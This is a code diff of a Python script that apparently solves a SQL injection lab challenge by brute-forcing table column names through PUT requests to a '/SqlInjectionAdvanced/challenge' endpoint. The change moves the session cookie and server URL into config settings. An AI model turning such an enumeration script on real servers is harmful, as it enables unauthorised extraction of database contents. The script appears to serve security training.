@@ -1,21 +1,23 @@
 import json
 import requests
+from config.settings import SESSION_COOKIE, SERVER_URL
 
-def find_columns_for_table(cookie, server_url, table_name):
+def find_columns_for_table(table_name):
     """
     Finds all column names for a specific table.
     
     Args:
-        cookie (str): Session cookie for authentication.
-        server_url (str): The URL of the server to target.
         table_name (str): The table to inspect.
 
     Returns:
         list: A list of column names for the table.
     """
+    if not SESSION_COOKIE or not SERVER_URL:
+        raise ValueError("Server URL or session cookie is not configured in environment settings.")
+
     alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'
     headers = {
-        'Cookie': cookie,
+        'Cookie': SESSION_COOKIE,
     }
 
     def check_column_exists(starting_char, column_index, column_number):
@@ -28,7 +30,7 @@ def find_columns_for_table(cookie, server_url, table_name):
             'password_reg': 'a',
             'confirm_password_reg': 'a'
         }
-        r = requests.put(f'{server_url}/SqlInjectionAdvanced/challenge', headers=headers, data=data)
+        r = requests.put(f'{SERVER_URL}/SqlInjectionAdvanced/challenge', headers=headers, data=data)
 
         try:
             response = json.loads(r.text)
